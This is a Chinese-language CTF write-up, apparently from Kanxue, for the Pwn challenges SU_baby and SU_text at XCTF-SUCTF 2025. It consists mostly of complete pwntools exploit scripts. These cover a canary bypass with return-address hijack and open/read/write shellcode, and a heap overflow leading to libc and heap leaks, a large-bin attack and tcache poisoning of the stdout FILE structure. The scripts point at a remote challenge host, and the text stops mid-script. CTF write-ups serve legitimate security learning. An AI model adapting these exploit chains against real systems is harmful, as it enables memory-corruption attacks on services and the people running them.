---
title: XCTF-SUCTF 2025-部分Pwn题解
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589076&idx=1&sn=a4d861f2130373f4a922c1529d1fba78&chksm=b18c271e86fbae08ca00e3c9447214607f5d2bfc89d8578c33474f3e72602833a386405c44e4&scene=58&subscene=0#rd
source: 看雪学苑
date: 2025-01-23
fetch_date: 2025-10-06T20:10:56.812620
---

# XCTF-SUCTF 2025-部分Pwn题解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXP6fsJPXcCibAicGe9dvAlIQC21iboMgGcQLpEC9xh61b1KqWGS17jokNg/0?wx_fmt=jpeg)

# XCTF-SUCTF 2025-部分Pwn题解

imLZH1

看雪学苑

```
1

SU_baby
```

队友分析出来可以绕过 canary, 劫持返回地址到 attack。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXCrIKyf2K5ZTCUIQYExAFLINBokibI0ywTTnpkEmyvzHia7ibsv8icd0DKw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXCwoMicBlRdZR9pryZPgk3yx8aZIs17nLNarGLGGTGiaf5LdhUF66Eyqg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXic28icHGmbI2DWuuLGstcZEXRDyWfiaeribBjlwWAwIgPyEic8BkE1YFmww/640?wx_fmt=png&from=appmsg)

‍

### exploit

‍

```
# imLZH1
from pwn import *
#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

attack = '1.95.76.73:10000'
binary = './ASU1'

def start(argv=[], *a, **kw):
    if args.GDB:return gdb.debug(binary,gdbscript)
    if args.TAG:return remote(*args.TAG.split(':'))
    if args.REM:return remote(*attack.split(':'))
    return process([binary] + argv, *a, **kw)

context(binary = binary, log_level = 'debug',
terminal='tmux splitw -h -l 170'.split(' '))

libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')

#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)

gdbscript = '''
#continue
'''.format(**locals())

#io = rmote()
io = start([])

def cmd(a):
    sla(b': ',str(a))
def case1(id,name,con):
    cmd(1)
    sa(b'ID: ',id)
    sa(b': ',name)
    sa(b': ',con)
def detele(id):
    cmd(2)
    sla(b'ID: ',id)
def addfile(name,con):
    io.recv()
    sl(name)
    io.recv()
    s(con)

#'\x89\xc7\x56\x0f\x0f'

cmd(8)
sla(b':',str(10))
addfile(b'flag1',b'a')
addfile(b'flag2',b'b')
addfile(b'flag3','\x90\x90\x89\xc7\x54\x5e\x0f\x05')#   8
addfile(b'flag4',b'\x90')
addfile(b'flag5',b'\x90'*4)
addfile(b'flag6',b'\x90\x89\xc7\x54\x5e\x0f\x05'+b'\x56\x0f')
addfile(b'flag7',b'\x90\x90\x90\x89\xc7\x54\x5e\x0f\x05') # 9

xxx  = '''
mov edi,eax
push rsp
pop rsi
syscall
'''

gadget = 0x04028A6
#gdb.attach(io,f'b *{gadget}')
ru('opportunity')

sc1='''
nop
nop
nop
nop
nop
nop
'''

sc1 = asm(sc1)
s(sc1)

ru('want to do?')
sl(p64(gadget))

print(disasm(asm(xxx)))

pause()

sc  = asm(shellcraft.open('flag'))
sc += asm(shellcraft.read('rax','rsp',0x40))
sc += asm(shellcraft.write(1,'rsp',0x40))
sl(b'\x90'*0x80+sc)

#pay = flat({
#},filler=b'\x00')
#gdb.attach(io,gdbscript)

itr()
```

‍

‍

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXZ1Q3GhII51SDUAe7KWe5iblLg9VZRNUafG8Vib4lxxeIwIqEk8mBJjSQ/640?wx_fmt=png&from=appmsg)

‍

‍

```
2

SU_text
```

### 分析

这里会heap++ 指针

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXNQiasGF7BoahicN3e7Bj5icQ3uZdicHv8HKAkf9E6ZKpCw6zkh6iaZf0Mhg/640?wx_fmt=png&from=appmsg)

如果紧接着调用的话，这里的 heap 指针也是++ 后的，基地址发生偏移，从而堆溢出。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXPViaQsicFLUqlxbicRRQHVcBXvXToz1RtQFy4YPKux9icVDNqkibO8Buyicg/640?wx_fmt=png&from=appmsg)

后面 large\_bin\_attack 攻击`mp_`,

### exploit

```
# imLZH1
from pwn import *
#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

attack = '1.95.76.73:10010'
binary = './SU_text'

def start(argv=[], *a, **kw):
    if args.GDB:return gdb.debug(binary,gdbscript)
    if args.TAG:return remote(*args.TAG.split(':'))
    if args.REM:return remote(*attack.split(':'))
    return process([binary] + argv, *a, **kw)

context(binary = binary, log_level = 'debug',
terminal='tmux splitw -h -l 170'.split(' '))

libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')

#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)

gdbscript = '''
#b *printf
#continue
'''.format(**locals())

def add(idx,size):
    pay  = b''
    pay += p8(1)
    pay += p8(0x10)
    pay += p8(idx)
    pay += p32(size)
    pay += p8(3)
    ru('bytes):\n')
    s(pay)

def rm(idx):
    pay  = b''
    pay += p8(1)
    pay += p8(0x11)
    pay += p8(idx)
    pay += p8(3)
    ru('bytes):\n')
    s(pay)

def write(idx,offset):
    pay  = b''
    pay += p8(2)
    pay += p8(idx)
    pay += p8(0x10)
    pay += p8(0x16)
    pay += p32(offset)
    pay += p8(0)
    pay += p8(3)
    return pay

def heap_to_buf(offset):
    pay  = b''
    pay += p8(2)
    pay += p8(0)
    pay += p8(0x10)
    pay += p8(0x15)
    pay += p32(offset)
    pay += p64(0) # buf
    pay += p8(0)
    pay += p8(3)
    return pay

def buf_to_heap(idx,offset,data):
    pay  = b''
    pay += p8(2)
    pay += p8(idx)
    pay += p8(0x10)
    pay += p8(0x14)
    pay += p32(offset)
    pay += p64(data) # buf
    pay += p8(0)
    pay += p8(3)
    return pay

def heap_add(idx,data1,data2):
    data1 = data1 & 0xFFFFFFFF
    data2 = data2 & 0xFFFFFFFF
    pay  = b''
    pay += p8(2)
    pay += p8(idx)
    pay += p8(0x10)
    pay += p8(0x10)
    pay += p32(data1)
    pay += p32(data2) # buf
    pay += p8(0)
    pay += p8(3)
    return pay

# game 2 vuln
def s2_xor(idx,data1,data2):
    data1 = data1 & 0xFFFFFFFF
    data2 = data2 & 0xFFFFFFFF
    pay  = b''
    pay += p8(2)
    pay += p8(idx)
    pay += p8(0x11)
    pay += p8(0x12)
    pay += p32(data1)
    pay += p32(data2) # buf
    pay += p8(0)
    pay += p8(3)
    return pay

#io = rmote()
io = start([])
#pay = flat({
#},filler=b'\x00')

add(0, 0x418)
add(1, 0x418)
rm(0)
add(0, 0x418)

pay  = heap_to_buf(0)[:-1]
pay += write(0,0xffffffe7+8)

#heap_to_buf(0)
#write(0,0)

ru('bytes):\n')
s(pay)
libc_base = uu64(r(8)) - 0x203b20
lss('libc_base')

#ru('bytes):\n')
#pay = buf_to_heap(0, 0, libc_base & 0xFFFFFFFF00000000)
#s(pay)

ru('bytes):\n')
pay = buf_to_heap(0, 0, 0)
s(pay)

ru('bytes):\n')
pay = buf_to_heap(0, 8, 0)
s(pay)

#ru('bytes):\n')
#pay = heap_add(0, 0, libc_base + 0x2031ec)
#s(pay)

add(2,0x428)
add(3,0x428) # pad
add(4,0x418)
add(5,0x428) # pad

rm(2)

add(6,0x438) # pad

rm(4)

#gdb.attach(io,gdbscript='brva 0x001752')
target = libc_base + 0x2031ec - 0x20

ru('bytes):\n')
pay  = s2_xor(1, 1, 2)[:-2]
pay += s2_xor(1, 1, 2)[2:-2] * 19
pay += buf_to_heap(0,0x3e8,target)[2:-2]
pay += heap_to_buf(0x3e0)[2:-2]
pay += write(0,0xffffffe7+8+3)[2:]

s(pay)
lss('libc_base')
heap_base = uu64(r(8))
lss('heap_base')

add(7,0x438)

add(8,0x450)
add(9,0x450)

rm(9)
rm(8)

libc.address = libc_base
heap_base += 0x2000
key = heap_base >> 0xC
ru('bytes):\n')
pay  = s2_xor(7, 1, 2)[:-2]
pay += s2_xor(7, 1, 2)[2:-2] * 19
pay += buf_to_heap(7,0x3f0, libc.sym['_IO_2_1_stdout_'] ^ key)[2:]
sl(pay)

lss('key')
lss('heap_base')
print(hex(libc.sym['_IO_2_1_stdout_']))

add(0x8,0x450)
add(0x9,0x450)

fake_IO_addr = libc.sym['_IO_2_1_stdout_']

#fake_io = flat({
#    0x00: '  sh;',
#    0x18: libc.sym['setcontext'] +61,
#    0x20: fake_IO_addr, # 0x20 > 0x18
#    0x68: 0,                # rdi  #read fd
#    0x70: fake_IO_addr,     # rsi  #read buf
#    0x88: fake_IO_addr + 0x8,     # rdx  #read size
#    0xa0: fake_IO_addr,
#    0xa8: libc.s...